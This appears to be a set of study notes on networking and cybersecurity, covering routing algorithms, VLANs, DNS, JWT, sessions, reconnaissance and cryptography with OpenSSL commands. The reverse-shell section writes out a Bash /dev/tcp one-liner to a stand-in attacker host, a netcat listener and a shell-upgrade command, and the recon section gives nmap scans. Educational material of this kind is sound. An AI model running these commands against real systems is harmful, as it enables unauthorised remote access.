**Forwarding** is moving a packet to the next hop using the forwarding table (per packet, fast). **Routing** is building that table (slow, algorithmic). Routing treats the network as a weighted graph, and the goal is least-cost paths. An **Autonomous System (AS)** is a group of networks under one administration. Intra-AS protocols (IGP) are RIP and OSPF. The inter-AS protocol (EGP) is BGP.

#### Distance Vector (DV) Routing

Each router keeps a table of (destination, cost, next hop) and **periodically sends its whole vector to its direct neighbours only**. It is based on the **Bellman-Ford equation**:

**D\_x(y) = min over all neighbours v of \[ c(x, v) + D\_v(y) \]**

Algorithm: (1) initialise with cost 0 to itself, link cost to neighbours, infinity to everyone else; (2) on receiving a neighbour's vector, compute cost via that neighbour = link cost + neighbour's advertised cost, and keep it if smaller; (3) if the vector changed, send it to neighbours, and repeat until no change.

*Worked example.* Links: A-B = 1, B-C = 2, A-C = 7. A's initial vector is B = 1, C = 7. B advertises C = 2. A computes the cost to C via B as 1 + 2 = 3, which is less than 7, so A updates C = 3 via B.

Characteristics: asynchronous, distributed, a router only knows what its neighbours tell it (routing by rumour), and **good news travels fast but bad news travels slowly**.

**Count-to-infinity problem.** Line topology A - B - C with link costs of 1. A reaches C at cost 2 through B. The link B-C fails. B has lost its route to C, but A still advertises C = 2 (via B). B believes it can reach C through A at cost 3. A then hears B's C = 3 and updates to 4, then B to 5, and so on, counting up to infinity.

Fixes:

- **Define a small infinity** (RIP uses 16).
- **Split horizon:** do not advertise a route to the neighbour from which you learned it.
- **Poison reverse:** advertise it back to that neighbour with cost infinity.
- **Triggered updates** and **hold-down timers.**
- Split horizon does **not** fix loops involving three or more routers.

**RIP details:** metric = **hop count**, maximum 15, **16 means unreachable**. Update every **30 s**, route timeout 180 s, garbage collection 120 s. Runs over **UDP port 520**. RIPv2 adds subnet masks (CIDR) and multicast to 224.0.0.9. Suited only to small networks (diameter at most 15 hops).

#### Link State (LS) Routing

Every router learns the **entire topology** and computes shortest paths itself.

1. Discover neighbours (**Hello** packets) and measure link cost.
2. Build a **link state packet (LSP)** containing the router ID, a sequence number, an age, and the list of (neighbour, cost).
3. **Flood** the LSP to all routers. Each router forwards a new LSP out of every interface except the one it arrived on, and discards old copies using the sequence number.
4. Every router now has the same **link-state database**. Each runs **Dijkstra's algorithm** to build a shortest-path tree and from it the forwarding table.
5. A topology change triggers a new LSP. LSPs are also refreshed periodically.

**Dijkstra's algorithm** (non-negative edge costs only): keep a set of finalised nodes. Repeatedly pick the unfinalised node with the smallest tentative distance, finalise it, and relax its neighbours (dist\[v\] = min(dist\[v\], dist\[u\] + c(u, v))). Complexity is O(V^2) with an array and O((V + E) log V) with a heap.

*Worked example.* Edges: A-B = 2, A-C = 5, B-C = 1, B-D = 4, C-D = 2. Source A.

| Step | Finalised | B | C | D |
| --- | --- | --- | --- | --- |
| Start | A (0) | 2 | 5 | infinity |
| 1 | B (2) | 2 | min(5, 2+1) = 3 | 2+4 = 6 |
| 2 | C (3) | 2 | 3 | min(6, 3+2) = 5 |
| 3 | D (5) | 2 | 3 | 5 |

Final costs: B = 2, C = 3, D = 5. The next hop from A is B for all destinations (shortest-path tree edges: A-B, B-C, C-D).

**OSPF details:** runs **directly over IP (protocol 89)**. **Hierarchical:** the AS is divided into areas connected through the **backbone area 0**, which limits flooding and makes it scalable. Uses Hello packets, **DR/BDR** (designated router and backup) on broadcast networks, and multicast addresses 224.0.0.5 and 224.0.0.6. Supports VLSM, authentication, multiple equal-cost paths and cost based on bandwidth (for example 10^8 / bandwidth).

#### DV vs LS

| Feature | Distance vector | Link state |
| --- | --- | --- |
| Knowledge | Only neighbours' vectors | Complete topology |
| What is sent | Whole table, to neighbours | Own link states, to **all** routers (flooding) |
| Algorithm | Bellman-Ford | Dijkstra |
| Convergence | Slow, count-to-infinity | Fast |
| Computation and memory | Light | Heavy (database and Dijkstra) |
| Scalability | Small networks | Larger networks (areas) |
| Protocol | RIP | OSPF |
| Failure effect | Wrong information can propagate widely | A bad router mostly corrupts its own LSP |

#### BGP Details

**Path vector** protocol. Routes carry the full list of ASes on the path, and a router rejects a route that contains its own AS number, which prevents loops. It is **policy-based** (business relationships decide, not just shortest path). Runs over **TCP port 179**. **eBGP** is between ASes and **iBGP** is inside an AS.

#### Routing Exam Traps

- Dijkstra requires non-negative weights. Bellman-Ford handles negative weights (but not negative cycles).
- In DV a router sends its table only to neighbours. In LS a router sends only its **own** neighbour information, but to everyone.
- RIP's infinity is 16 (so a path of 15 hops is the longest valid one).
- When asked for the DV table after one exchange, use the neighbours' **old** vectors, not values updated in the same round.
- OSPF is not carried over UDP or TCP. BGP uses TCP. RIP uses UDP.

# VLAN (Virtual LAN)

Logically segments a single physical switch into multiple isolated broadcast domains, improving security and reducing broadcast traffic without needing separate physical switches.

#### Trunking

A trunk link carries traffic for multiple VLANs between switches, typically tagged using the 802.1Q standard.

#### Inter-VLAN Routing

Required for devices in different VLANs to communicate, done via a Layer 3 switch or a router-on-a-stick setup.

# Spanning Tree Protocol (STP)

Prevents Layer 2 loops in networks with redundant switch links by blocking backup paths until needed, avoiding broadcast storms. Elects a root bridge and calculates the shortest path to it from every switch.

# Additional Core Networking Concepts

#### Ports and Sockets

A port is a logical endpoint (0-65535) identifying a specific process or service on a device. A socket is the combination of an IP address and a port number, uniquely identifying a communication endpoint.

Well-known ports (0-1023): HTTP(80), HTTPS(443), FTP(21), SSH(22), DNS(53), SMTP(25).

#### MTU (Maximum Transmission Unit)

The largest packet size (in bytes) that can be transmitted over a network segment without fragmentation, typically 1500 bytes for Ethernet.

#### DNS Resolution Process

1. Browser checks local cache
2. Query sent to recursive resolver (usually ISP)
3. Resolver queries root server
4. Root refers to TLD server (.com, .org)
5. TLD refers to authoritative name server
6. Authoritative server returns the IP address

#### Robots.txt

**What is robots.txt?**

`robots.txt` is a text file on a website that tells search engine crawlers which pages they should or should not access.

**Example:**

```text
User-agent: *
Disallow: /admin/
Disallow: /private/
Allow: /
Sitemap: https://example.com/sitemap.xml
```

**Key Directives:**

- `User-agent`: Specifies which crawler the rule applies to.
- `Disallow`: Tells crawlers not to access a path.
- `Allow`: Permits crawlers to access a path.
- `Sitemap`: Provides the location of the sitemap.

**Cybersecurity Note:**

- Anyone can view `robots.txt`.
- It is **not a security mechanism**.
- Malicious bots can ignore its rules.
- Protect sensitive pages using authentication and access controls.

**Useful Commands:**

```bash
curl https://example.com/robots.txt
```

##### How to Create and Manage robots.txt

**1. Create the file**

- Create a plain-text file named `robots.txt`.
- Add crawler rules, for example:

```text
User-agent: *
Disallow: /admin/
Allow: /
Sitemap: https://example.com/sitemap.xml
```

**2. Upload the file**

- Place it in the website’s root directory.
- It should be accessible at `https://example.com/robots.txt`.

**3. Manage and test it**

- Edit the file whenever crawling rules change.
- Check it in a browser or run:

```bash
curl https://example.com/robots.txt
```

- Make sure the rules are correct and don't accidentally block important pages.

**Important:** `robots.txt` does not secure private pages. Use proper authentication and access controls to protect sensitive information.

#### DHCP Process (DORA)

1. Discover - client broadcasts to find a DHCP server
2. Offer - server offers an IP address
3. Request - client requests the offered IP
4. Acknowledge - server confirms the lease

#### Proxy Server

Acts as an intermediary between client and server, used for caching, filtering content, hiding client IPs, and access control.

#### Load Balancer

Distributes incoming traffic across multiple servers to improve availability, reliability, and performance.

#### Network Topologies

Bus, Star, Ring, Mesh, Hybrid - describe the physical or logical arrangement of network devices.

#### QoS (Quality of Service)

Prioritizes certain types of traffic (e.g., VoIP, video) over others to ensure performance for critical applications.

#### Wireless Standards

- WEP - old, insecure
- WPA/WPA2 - improved security, AES encryption in WPA2
- WPA3 - current standard, stronger encryption and protection against brute-force attacks

# Cybersecurity Fundamentals

#### Core Risk Vocabulary

- **Vulnerability**: A weakness that could be exploited (e.g., unpatched software).
- **Threat**: A potential cause of an unwanted incident (e.g., an attacker, malware).
- **Risk**: The likelihood and impact of a threat exploiting a vulnerability.
- **Exploit**: The actual method/code used to take advantage of a vulnerability.

#### Principle of Least Privilege

Users and systems should be granted only the minimum access necessary to perform their function, limiting damage from compromised accounts.

#### CIA Triad

- **Confidentiality**: Ensuring only authorized users can access data (encryption, access controls).
- **Integrity**: Ensuring data isn't altered or tampered with (hashing, checksums).
- **Availability**: Ensuring systems and data are accessible when needed (redundancy, DDoS protection).

#### AAA Framework

- **Authentication**: Verifying identity (passwords, biometrics, MFA)
- **Authorization**: Granting appropriate access/permissions
- **Accounting**: Logging and tracking user activity

#### Defense in Depth

A layered security approach using multiple overlapping controls (firewalls, IDS/IPS, endpoint protection, physical security) so that if one layer fails, others still protect the system.

#### Zero Trust

A security model based on "never trust, always verify" - no user or device is trusted by default, even inside the network perimeter; continuous verification is required.

# Access Control Models

- **DAC (Discretionary Access Control)**: Resource owner decides who gets access.
- **MAC (Mandatory Access Control)**: Access governed by fixed system-wide policy/labels (e.g., government/military systems).
- **RBAC (Role-Based Access Control)**: Access granted based on job role.
- **ABAC (Attribute-Based Access Control)**: Access decisions based on attributes (user, resource, environment).

# Authentication Standards

- **MFA (Multi-Factor Authentication)**: Combines something you know (password), have (token/phone), and are (biometrics).
- **SSO (Single Sign-On)**: One login grants access to multiple systems.
- **OAuth 2.0**: Authorization framework allowing third-party apps limited access without sharing credentials.
- **SAML**: XML-based standard for exchanging authentication/authorization data, common in enterprise SSO.
- **Kerberos**: Ticket-based network authentication protocol using a trusted third party (KDC), widely used in Active Directory.

# JWT (JSON Web Token)

JSON Web Token (JWT) is a compact URL-safe means of representing claims to be transferred between two parties. A compact, self-contained token format used for authentication and information exchange, structured in three Base64URL-encoded parts separated by dots: `Header.Payload.Signature`.

#### Structure

- **Header**: Specifies the token type and signing algorithm (e.g., HS256, RS256).
- **Payload**: Contains claims (user data, expiry, issuer, etc.). Not encrypted, only encoded — never store secrets here.
- **Signature**: Verifies the token hasn't been tampered with, created by signing the header+payload with a secret (HMAC) or private key (RSA/ECDSA).

#### How It Works

1. User authenticates; server issues a signed JWT.
2. Client stores the JWT (e.g., in memory, localStorage, or a cookie) and sends it with each request (commonly `Authorization: Bearer <token>`).
3. Server verifies the signature and claims on each request — no server-side session lookup needed.

#### JWT vs Session Tokens

| JWT | Session Token |
| --- | --- |
| Stateless, self-contained | Stateful, server stores session data |
| Server doesn't need to store token | Requires session store (DB/Redis) |
| Harder to revoke before expiry | Easy to revoke (delete session) |
| Scales well across servers | Needs shared session store to scale |

#### Common Vulnerabilities

- **alg:none attack**: Attacker sets algorithm to "none" and strips the signature; poorly implemented verifiers accept it.
- **Algorithm confusion**: Tricking an RS256 verifier into treating the public key as an HMAC secret.
- **Weak secret**: Brute-forcing a short/guessable HMAC signing secret.
- **No expiry validation**: Tokens accepted indefinitely if `exp` isn't checked.
- **Sensitive data in payload**: Payload is only encoded, not encrypted — readable by anyone with the token.

# Cookies and Sessions

#### Cookies

An internet cookie (or HTTP cookie) is a small text file that a web server sends to your web browser and stores on your device. Small key-value pairs stored by the browser and sent automatically with requests to the issuing domain.

Key attributes:

- **Secure**: Only sent over HTTPS.
- **HttpOnly**: Inaccessible to JavaScript, mitigates XSS-based theft.
- **SameSite**: Controls cross-site sending (`Strict`, `Lax`, `None`) — mitigates CSRF.
- **Domain/Path**: Scopes which requests include the cookie.
- **Expires/Max-Age**: Controls cookie lifetime.

#### Sessions

A web session is a temporary connection and data-sharing period between a user's browser and a web server. Server-side state tied to a client via a session ID stored in a cookie.

```text
Login → Server creates session (stored server-side) → Session ID sent as cookie
     → Client sends cookie on each request → Server looks up session
```

#### Cookie/Session-Based Auth vs Token-Based (JWT) Auth

| Cookie/Session | JWT |
| --- | --- |
| Server stores session state | Stateless, self-contained |
| Revocation is immediate | Revocation requires extra mechanism (blocklist, short expiry) |
| Vulnerable to CSRF (mitigate with SameSite/CSRF tokens) | Not inherently CSRF-vulnerable if not stored in cookies |
| Vulnerable to session hijacking if ID leaked | Vulnerable to token theft if leaked (e.g., via XSS) |

# Reconnaissance

The information-gathering phase of an attack (or a pentest), typically split into passive and active recon.

#### Passive Recon

Gathering information without directly interacting with the target's systems.

- OSINT (WHOIS lookups, DNS records, social media, job postings, GitHub leaks)
- Search engine dorking (Google dorks)
- Certificate transparency logs (crt.sh) for subdomain discovery

#### Active Recon

Directly interacting with the target's infrastructure — noisier, more detectable.

- Port scanning (`nmap`)
- Service/version detection and OS fingerprinting
- DNS zone transfers, subdomain brute-forcing
- Banner grabbing

**Common tools:**

```bash
nmap -sV -sC -p- target.com        # full port scan with version/script detection
whois target.com
dig target.com ANY
theharvester -d target.com -b all
```

#### Enumeration

Follows recon; actively extracting detailed information from discovered services (users, shares, running software versions) to identify attack surface.

# Exploitation

The phase where an attacker leverages a discovered vulnerability to gain unauthorized access or execute code.

#### Exploit Types

- **Remote Code Execution (RCE)**: Executing arbitrary code on a target system remotely.
- **Local Privilege Escalation (LPE)**: Elevating privileges after initial access is gained.
- **Public exploits**: Pre-written exploit code (Metasploit modules, Exploit-DB) for known CVEs.
- **Custom/0-day exploits**: Exploits for vulnerabilities with no public patch or disclosure.

#### Typical Exploitation Workflow

```text
Recon → Identify vulnerable service/version
     → Find/develop exploit
     → Gain initial access (shell, RCE)
     → Post-exploitation (privilege escalation, persistence, lateral movement)
```

#### Common Frameworks/Tools

- **Metasploit**: Framework with modules for exploits, payloads, and post-exploitation.
- **Burp Suite**: Web application testing (interception, fuzzing, manual exploitation).
- **searchsploit**: CLI search against Exploit-DB.

# Reverse Shells and Bind Shells

#### Bind Shell

The target machine opens a listening port and waits for the attacker to connect. Requires the target's port to be reachable — often blocked by firewalls/NAT on the target side.

#### Reverse Shell

The target machine initiates the connection back to the attacker's listener. Preferred in practice because outbound connections are commonly less restricted than inbound ones.

```text
Attacker (listener)  ←──── connects ────  Target (victim)
```

**Attacker sets up a listener:**

```bash
nc -lvnp 4444
```

**Target connects back (example, Linux Bash):**

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Common reverse shell payloads:** Netcat, Bash, Python, PHP, PowerShell (Windows) — the mechanism differs, the principle is the same: victim connects out to attacker.

#### Shell Stabilization

Raw reverse shells are often unstable (no job control, no tab-completion). Common upgrade technique:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

followed by setting terminal size and enabling raw mode for a fully interactive TTY.

> **Note:** Reverse/bind shell techniques are standard penetration-testing and CTF knowledge — only use them against systems you own or are explicitly authorized to test.

# Network Security Devices

#### Firewall

Filters incoming and outgoing traffic based on defined security rules. Types include packet-filtering, stateful inspection, and next-generation firewalls (NGFW) with deep packet inspection.

#### IDS (Intrusion Detection System)

Monitors network traffic for suspicious activity and alerts administrators, but doesn't block traffic.

#### IPS (Intrusion Prevention System)

Similar to IDS but actively blocks or prevents detected threats in real time.

#### DMZ (Demilitarized Zone)

A buffer network segment placed between the internal trusted network and the untrusted internet, hosting public-facing services (web servers, mail servers) while isolating the internal network.

#### VPN (Virtual Private Network)

Creates an encrypted tunnel over a public network, allowing secure remote access. Common protocols: IPsec, OpenVPN, WireGuard, SSL/TLS VPN.

# Common Cyber Threats and Attacks

#### Malware

- **Virus**: Attaches to files, requires user action to spread.
- **Worm**: Self-replicating, spreads without user interaction.
- **Trojan**: Disguised as legitimate software.
- **Ransomware**: Encrypts data and demands payment for the decryption key.
- **Spyware**: Secretly monitors user activity.
- **Rootkit**: Hides deep in the system to maintain persistent, privileged access.

#### Phishing

Deceptive attempts (usually email) to trick users into revealing sensitive information or clicking malicious links. Variants: spear phishing (targeted), whaling (targets executives), smishing (SMS), vishing (voice).

#### Man-in-the-Middle (MITM)

An attacker secretly intercepts and potentially alters communication between two parties who believe they are communicating directly.

#### DoS / DDoS

- **DoS**: Overwhelms a system from a single source, denying service to legitimate users.
- **DDoS**: Same, but from multiple distributed sources (often a botnet), harder to mitigate.

#### SQL Injection

Attacker inserts malicious SQL code into input fields to manipulate or extract data from a database.

#### Cross-Site Scripting (XSS)

Attacker injects malicious scripts into trusted websites that execute in a victim's browser.

#### Social Engineering

Manipulating people psychologically into divulging confidential information or performing actions that compromise security.

#### Zero-Day Attack

An exploit targeting a vulnerability that is unknown to the vendor and has no available patch yet.

#### ARP Spoofing / Poisoning

Attacker sends falsified ARP messages to associate their MAC address with a legitimate IP, enabling traffic interception.

#### Brute Force Attack

Systematically attempting all possible password combinations until the correct one is found.

#### Cross-Site Request Forgery (CSRF)

Tricks an authenticated user's browser into submitting unwanted requests to a site they're logged into, performing actions without their consent.

#### Buffer Overflow

Occurs when a program writes more data to a buffer than it can hold, potentially overwriting adjacent memory and allowing arbitrary code execution.

#### Privilege Escalation

Exploiting a bug or misconfiguration to gain higher-level access than intended (vertical) or access to other accounts at the same level (horizontal).

#### Supply Chain Attack

Compromising a trusted third-party vendor or software component to indirectly attack the target organization.

#### Insider Threat

A security risk originating from someone within the organization (employee, contractor) with legitimate access.

# Cryptography

**Cryptography** is the practice of protecting information using mathematical techniques. It is used to provide **confidentiality, integrity, authentication, and non-repudiation**.

The main cryptographic concepts used in networking and Linux security are:

- Symmetric encryption
- Asymmetric encryption
- Hashing
- Digital signatures
- PKI
- Digital certificates
- SSL/TLS
- Salting

#### Symmetric Encryption

Symmetric encryption uses **the same secret key** to encrypt and decrypt data.

```text
Plaintext
   ↓
[ Encryption + Secret Key ]
   ↓
Ciphertext
   ↓
[ Decryption + Same Secret Key ]
   ↓
Plaintext
```

The main advantage is **speed**. Symmetric algorithms are much faster than asymmetric algorithms and are therefore commonly used to encrypt large amounts of data.

The main challenge is **key distribution**: both parties need to securely obtain the same secret key.

**Examples:**

| Algorithm | Description |
| --- | --- |
| AES | Modern, secure, widely used symmetric cipher |
| DES | Old 56-bit cipher; considered insecure |
| 3DES | Applies DES multiple times; legacy and deprecated |

##### AES (Advanced Encryption Standard)

AES is one of the most widely used symmetric encryption algorithms.

Common key sizes are:

- AES-128
- AES-192
- AES-256

The number represents the **key size in bits**, not the block size. AES always uses a **128-bit block size**.

AES is commonly used for:

- Disk encryption
- VPNs
- TLS
- File encryption
- Database encryption
- Application-level encryption

**Linux command:**

```bash
openssl enc -aes-256-cbc -salt -pbkdf2 -in secret.txt -out secret.txt.enc
```

This command:

- `openssl` → invokes OpenSSL.
- `enc` → uses OpenSSL's symmetric encryption interface.
- `-aes-256-cbc` → uses AES-256 in CBC mode.
- `-salt` → adds a random salt when deriving the encryption key from a password.
- `-pbkdf2` → derives the encryption key using PBKDF2.
- `-in secret.txt` → input file.
- `-out secret.txt.enc` → encrypted output file.

OpenSSL asks for a password and derives the encryption key from it.

To decrypt:

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in secret.txt.enc -out secret.txt
```

`-d` means **decrypt**.

> AES-CBC provides confidentiality but does not by itself provide authentication/integrity. Modern applications commonly prefer authenticated encryption modes such as AES-GCM.

##### DES

DES is an old symmetric encryption algorithm using an effective **56-bit key**.

Because modern computers can brute-force its key space, DES is considered **insecure** and should not be used for new systems.

```text
DES → Legacy → Insecure
AES → Modern → Preferred
```

**Linux/OpenSSL example:**

```bash
openssl enc -des-cbc -in secret.txt -out secret.des
```

This is useful mainly for understanding legacy systems, not for protecting new data.

##### 3DES (Triple DES)

3DES applies the DES operation multiple times to increase security compared with original DES.

It was historically used in:

- Banking systems
- Payment systems
- Legacy applications
- Older network protocols

However, 3DES is now considered **legacy/deprecated** and should generally be replaced with AES.

#### Asymmetric Encryption

Asymmetric cryptography uses a **pair of mathematically related keys**:

- **Public key** → can be shared with others.
- **Private key** → must remain secret.

```text
              Key Pair
             /        \\
       Public Key    Private Key
          ↓              ↓
      Share openly    Keep secret
```

Unlike symmetric encryption, the same key is not used for both operations.

Asymmetric cryptography is commonly used for:

- Secure key exchange
- Authentication
- Digital signatures
- Certificates
- SSH
- TLS

It is computationally more expensive than symmetric encryption, so systems commonly use asymmetric cryptography to establish trust or exchange keys and then use symmetric encryption for the actual data transfer.

#### RSA (Rivest-Shamir-Adleman)

RSA is a widely known asymmetric cryptographic algorithm based on the mathematical difficulty of factoring large numbers.

RSA uses:

- Public key
- Private key

It can be used for:

- Encryption
- Digital signatures
- Authentication
- Key transport

Modern RSA keys commonly use sizes such as **2048 or 3072 bits**.

**Generate an RSA private key:**

```bash
openssl genrsa -out private.key 2048
```

This creates a 2048-bit RSA private key.

**Extract the public key:**

```bash
openssl rsa -in private.key -pubout -out public.key
```

The resulting files are:

```text
private.key → Keep secret
public.key  → Can be shared
```

**Important:** RSA is generally not used to encrypt large files directly. Symmetric encryption is much more efficient for bulk data.

#### ECC (Elliptic Curve Cryptography)

ECC uses mathematical properties of **elliptic curves** to provide asymmetric cryptography.

Its major advantage is that it can provide strong security with **smaller keys** compared with RSA.

ECC is commonly used in:

- TLS
- SSH
- Digital signatures
- Mobile devices
- Modern authentication systems

Common elliptic-curve algorithms include:

- ECDSA → digital signatures
- ECDH → key agreement

**Generate an EC private key:**

```bash
openssl ecparam -name prime256v1 -genkey -noout -out ec-private.key
```

Extract the public key:

```bash
openssl ec -in ec-private.key -pubout -out ec-public.key
```

The `prime256v1` curve is also commonly referred to as **secp256r1**.

#### Diffie-Hellman (DH)

Diffie-Hellman is primarily a **key-agreement protocol**, not an encryption algorithm.

It allows two parties to establish a shared secret over an insecure network without directly transmitting the secret itself.

Simplified:

```text
Alice                          Bob
  │                             │
  │──── Public information ─────│
  │                             │
  │   Calculate shared secret   │
  │                             │
  └──────── Same secret ────────┘
```

An attacker may observe the exchanged public information but should not be able to practically calculate the resulting shared secret when appropriate parameters are used.

**Linux/OpenSSL example:**

Generate DH parameters:

```bash
openssl dhparam -out dhparam.pem 2048
```

This creates Diffie-Hellman parameters that can be used by applications supporting DH.

Modern TLS commonly uses **ephemeral Diffie-Hellman variants**, such as ECDHE, to provide forward secrecy.

#### Hashing

Hashing converts input data into a **fixed-length digest**.

```text
Input
  ↓
Hash Function
  ↓
Fixed-Length Digest
```

A cryptographic hash function should make it computationally infeasible to:

- Recover the original input from the hash.
- Find another input producing the same hash.
- Modify the input without changing the resulting digest.

Hashing is **not encryption** because there is normally no decryption operation.

Common examples:

| Algorithm | Status | Common use |
| --- | --- | --- |
| SHA-256 | Secure for general cryptographic hashing | Integrity, signatures, checksums |
| SHA-512 | Secure for general cryptographic hashing | Integrity and cryptographic applications |
| MD5 | Broken for collision resistance | Legacy checksums only |
| SHA-1 | Broken for collision resistance | Legacy systems |
| bcrypt | Password hashing | Password storage |

##### SHA-256

SHA-256 produces a **256-bit digest**, normally represented as 64 hexadecimal characters.

Example:

```bash
echo -n "hello" | sha256sum
```

The command:

- `echo -n "hello"` → outputs `hello` without a newline.
- `|` → sends the output to the next command.
- `sha256sum` → calculates the SHA-256 digest.

To hash a file:

```bash
sha256sum secret.txt
```

This is useful for checking whether a file has changed.

For example:

```text
Original file
     ↓
SHA-256
     ↓
ABC123...

File received
     ↓
SHA-256
     ↓
ABC123...
```

If both digests match, the files have the same content with extremely high probability.

##### MD5

MD5 produces a 128-bit digest but is **not considered secure for cryptographic integrity or signatures** because practical collision attacks exist.

Linux command:

```bash
md5sum secret.txt
```

MD5 may still appear in legacy systems or non-security-sensitive file identification, but it should not be selected for new security designs.

##### bcrypt

bcrypt is specifically designed for **password hashing**.

Unlike a fast hash such as SHA-256, bcrypt is intentionally computationally expensive, making large-scale password guessing more difficult.

Example:

```bash
htpasswd -bnBC 12 "" 'MyPassword' | tr -d ':\n'
```

This can generate a bcrypt password hash when the Apache `htpasswd` utility is installed.

The `12` is the bcrypt **cost factor**.

> For new password-storage systems, modern password-hashing choices may also include Argon2id, depending on application support.

#### Digital Signatures

A digital signature proves that data was signed by someone possessing a particular **private key** and that the signed data has not been altered.

Simplified process:

```text
Message
   ↓
Hash
   ↓
Sign hash with Private Key
   ↓
Digital Signature
```

The receiver uses the corresponding public key to verify the signature.

```text
Message + Signature
        ↓
 Public Key
        ↓
 Verify
        ↓
Valid / Invalid
```

Digital signatures provide:

- **Authentication** — identifies the holder of the private key.
- **Integrity** — detects changes to the signed data.
- **Non-repudiation** — provides evidence that the private-key holder created the signature, subject to the surrounding key-management and legal context.

**Linux/OpenSSL example:**

Generate a signature:

```bash
openssl dgst -sha256 -sign private.key -out signature.bin secret.txt
```

Verify it:

```bash
openssl dgst -sha256 -verify public.key -signature signature.bin secret.txt
```

If the signature matches, OpenSSL reports:

```text
Verified OK
```

If the file is modified after signing, verification fails.

#### PKI (Public Key Infrastructure)

PKI is the larger framework used to **create, distribute, manage, validate, and revoke digital certificates and public keys**.

PKI commonly involves:

- **Certificate Authority (CA)** — trusted organization that issues certificates.
- **Root CA** — trust anchor at the top of a certificate chain.
- **Intermediate CA** — issues certificates on behalf of a root CA.
- **Registration Authority (RA)** — helps validate certificate requests/identities.
- **Digital certificates** — bind identities to public keys.
- **Certificate revocation mechanisms** — such as CRLs and OCSP.

A simplified hierarchy:

```text
Root CA
   ↓
Intermediate CA
   ↓
Server Certificate
   ↓
example.com
```

When a browser connects to a secure website, it can validate the server's certificate against trusted CA certificates.

#### Digital Certificates

A digital certificate is an electronic document that binds a **public key to an identity**.

A typical TLS certificate contains information such as:

- Subject/domain information
- Public key
- Issuer
- Validity period
- Serial number
- Signature from the issuing CA
- Subject Alternative Names (SANs)

Example:

```text
example.com
     ↓
Certificate
     ↓
Public Key
     ↓
Signed by CA
```

The CA's digital signature allows clients to verify that the certificate was issued by a trusted authority.

**Inspect a certificate:**

```bash
openssl x509 -in certificate.crt -text -noout
```

This displays certificate details in human-readable form.

For a live HTTPS server:

```bash
openssl s_client -connect example.com:443 -servername example.com
```

This establishes a TLS connection and displays certificate/TLS information.

#### SSL/TLS

**TLS (Transport Layer Security)** protects data transmitted between applications over a network.

SSL is the older predecessor to TLS and is **obsolete and insecure**. Modern systems should use TLS.

TLS provides:

- Encryption
- Integrity
- Server authentication
- Optional client authentication

A simplified TLS connection:

```text
Client
  │
  │ ClientHello
  ↓
Server
  │
  │ Certificate + TLS parameters
  ↓
Client
  │
  │ Key agreement
  ↓
Secure encrypted session
```

The exact handshake differs by TLS version and negotiated cipher suite, but modern TLS generally uses asymmetric cryptography for authentication and/or key agreement and symmetric cryptography for efficient bulk encryption.

**Common port:**

```text
HTTPS → TCP 443
```

Inspect a TLS server:

```bash
openssl s_client -connect example.com:443 -servername example.com
```

Useful information can include:

- Certificate chain
- TLS version
- Negotiated cipher
- Server certificate
- Connection details

Check supported TLS versions/ciphers with tools such as:

```bash
openssl ciphers -v
```

#### Salting

A **salt** is random data added to a password before password hashing.

Without salting:

```text
Password
   ↓
Hash
   ↓
Same password → Same hash
```

With salting:

```text
Password + Random Salt
          ↓
       Hashing
          ↓
       Password Hash
```

Different users with the same password should therefore have different stored password hashes.

Example:

```text
User A:
Password + Salt A → Hash A

User B:
Password + Salt B → Hash B
```

Salting helps defend against:

- Precomputed rainbow tables
- Simple hash lookup attacks
- Identical hashes revealing identical passwords

A salt does **not** need to be secret. It is normally stored alongside the password hash.

Password-hashing algorithms such as **bcrypt, scrypt, and Argon2** automatically incorporate salts as part of their normal operation.

#### Encryption vs Hashing vs Encoding

These concepts are often confused.

| Technique | Reversible? | Uses Key? | Main Purpose |
| --- | --- | --- | --- |
| Encryption | Yes | Yes | Confidentiality |
| Hashing | No | No | Integrity / fingerprinting |
| Encoding | Yes | No | Data representation |
| Digital Signature | Verification, not decryption | Private/public key | Authenticity + integrity |

Example:

```text
Encryption:
"hello" → encrypted data → "hello"

Hashing:
"hello" → SHA-256 → digest

Encoding:
"hello" → Base64 → "aGVsbG8="
```

**Base64 is not encryption.** Anyone can decode it.

Linux example:

```bash
echo -n "hello" | base64
```

Decode:

```bash
echo -n "aGVsbG8=" | base64 -d
```

#### Symmetric vs Asymmetric

| Symmetric | Asymmetric |
| --- | --- |
| One shared secret key | Public/private key pair |
| Same secret used for encryption/decryption | Different but mathematically related keys |
| Very fast | Slower |
| Good for bulk data | Good for authentication/key exchange |
| Key distribution is challenging | Public key can be shared |
| AES | RSA, ECC |
| Used for bulk TLS encryption | Used for TLS authentication/key agreement |

#### Common Cryptography Algorithms

| Category | Examples | Main Purpose |
| --- | --- | --- |
| Symmetric encryption | AES | Encrypt bulk data |
| Legacy symmetric | DES, 3DES | Legacy systems |
| Asymmetric | RSA | Encryption/signatures |
| Asymmetric | ECC | Signatures/key agreement |
| Key agreement | DH, ECDH | Establish shared secrets |
| Hashing | SHA-256, SHA-512 | Integrity/fingerprinting |
| Legacy hashing | MD5, SHA-1 | Legacy/non-security uses |
| Password hashing | bcrypt, Argon2id | Secure password storage |
| Digital signature | RSA-PSS, ECDSA, Ed25519 | Authentication/integrity |
| Transport security | TLS | Secure network communication |

#### Useful Linux Cryptography Commands

| Command | Purpose |
| --- | --- |
| `openssl version` | Show OpenSSL version |
| `sha256sum file` | Calculate SHA-256 hash |
| `sha512sum file` | Calculate SHA-512 hash |
| `md5sum file` | Calculate MD5 hash |
| `openssl rand -hex 32` | Generate 32 random bytes as hexadecimal |
| `openssl genrsa -out private.key 2048` | Generate RSA private key |
| `openssl rsa -in private.key -pubout` | Extract RSA public key |
| `openssl ecparam -name prime256v1 -genkey -noout -out ec.key` | Generate EC private key |
| `openssl x509 -in cert.crt -text -noout` | Inspect certificate |
| `openssl dgst -sha256 -sign private.key -out sig file` | Create digital signature |
| `openssl dgst -sha256 -verify public.key -signature sig file` | Verify digital signature |
| `openssl s_client -connect host:443` | Inspect a TLS connection |
| `openssl ciphers -v` | List available cipher suites |
| `openssl rand -base64 32` | Generate random data |
| `base64 file` | Encode data using Base64 |
| `base64 -d file` | Decode Base64 data |

> **Security note:** For new systems, prefer modern algorithms and constructions such as **AES-GCM/ChaCha20-Poly1305, SHA-256/SHA-512 where appropriate, Ed25519/ECDSA, modern TLS, and Argon2id/bcrypt for passwords**. Avoid DES, 3DES, MD5, SHA-1, SSL, and direct password-based encryption schemes unless you are specifically dealing with legacy systems.

